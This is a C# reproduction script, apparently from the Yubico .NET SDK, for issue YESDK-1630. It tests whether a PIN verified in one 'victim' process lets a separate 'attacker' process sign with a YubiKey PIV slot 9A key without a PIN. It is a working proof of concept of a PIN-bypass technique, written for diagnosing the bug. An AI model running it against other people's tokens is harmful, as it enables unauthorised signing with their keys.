#:project ../../../../../src/Piv/src/Yubico.YubiKit.Piv.csproj
#:property TargetFramework=net10.0
// YESDK-1630 cross-process repro. Each mode runs in its own OS process.
// Usage: dotnet run app.cs -- <serial> setup|sign|verify
using System.Security.Cryptography;
using Yubico.YubiKit.Core.Devices;
using Yubico.YubiKit.Core.Cryptography;
using Yubico.YubiKit.Piv;

int serial = int.Parse(args[0]);
string mode = args[1];
byte[] mgmt = [1, 2, 3, 4, 5, 6, 7, 8, 1, 2, 3, 4, 5, 6, 7, 8, 1, 2, 3, 4, 5, 6, 7, 8];
byte[] digest = SHA256.HashData("cross-process pin state"u8);
string pubPath = Path.Combine(Path.GetTempPath(), $"yesdk1630-{serial}.spki");

if (Environment.GetEnvironmentVariable("EXCL") == "1") { AppContext.SetSwitch(Yubico.YubiKit.Core.CoreCompatSwitches.OpenSmartCardHandlesExclusively, true); Console.WriteLine("exclusive switch ON"); }
var device = (await YubiKeyManager.FindAllAsync()).Single(d => d.SerialNumber == serial);
await using var session = await device.CreatePivSessionAsync();
Console.WriteLine($"pid={Environment.ProcessId} mode={mode}");
switch (mode)
{
    case "setup":
        await session.ResetAsync();
        await session.AuthenticateAsync(mgmt);
        var pub = (ECPublicKey)await session.GenerateKeyAsync(PivSlot.Authentication, PivAlgorithm.EccP256,
            new PivKeyCreationOptions { PinPolicy = PivPinPolicy.Once, TouchPolicy = PivTouchPolicy.Never });
        File.WriteAllBytes(pubPath, pub.ExportSubjectPublicKeyInfo());
        Console.WriteLine("setup ok");
        break;
    case "verify":
        await session.VerifyPinAsync("123456"u8.ToArray());
        Console.WriteLine("pin verified; disposing session and exiting");
        break;
    case "verify-wait":
        await session.VerifyPinAsync("123456"u8.ToArray());
        Console.WriteLine("pin verified; victim session stays open 15s");
        await Task.Delay(15000);
        Console.WriteLine("victim disposing");
        break;
    case "poll":
        for (int i = 0; i < 40; i++)
        {
            try
            {
                await session.SignOrDecryptAsync(PivSlot.Authentication, PivAlgorithm.EccP256, digest);
                Console.WriteLine($"{DateTime.Now:HH:mm:ss.fff} attacker SIGNED without PIN (poll {i})");
                return;
            }
            catch (Exception) { Console.WriteLine($"{DateTime.Now:HH:mm:ss.fff} attacker rejected (poll {i})"); }
            await Task.Delay(1000);
        }
        break;
    case "hold":
        var flag = Path.Combine(Path.GetTempPath(), $"yesdk1630-{serial}.go");
        File.Delete(flag);
        Console.WriteLine("attacker session open (no PIN); waiting for victim...");
        while (!File.Exists(flag)) await Task.Delay(100);
        goto case "sign";
    case "sign":
        try
        {
            var sig = await session.SignOrDecryptAsync(PivSlot.Authentication, PivAlgorithm.EccP256, digest);
            using var ecdsa = ECDsa.Create();
            ecdsa.ImportSubjectPublicKeyInfo(File.ReadAllBytes(pubPath), out _);
            bool ok = ecdsa.VerifyHash(digest, sig.Span, DSASignatureFormat.Rfc3279DerSequence);
            Console.WriteLine($"SIGNED WITHOUT PIN in this process; signature verifies against slot 9A key: {ok}");
        }
        catch (Exception e)
        {
            Console.WriteLine($"sign rejected: {e.GetType().Name}: {e.Message}");
        }
        break;
}
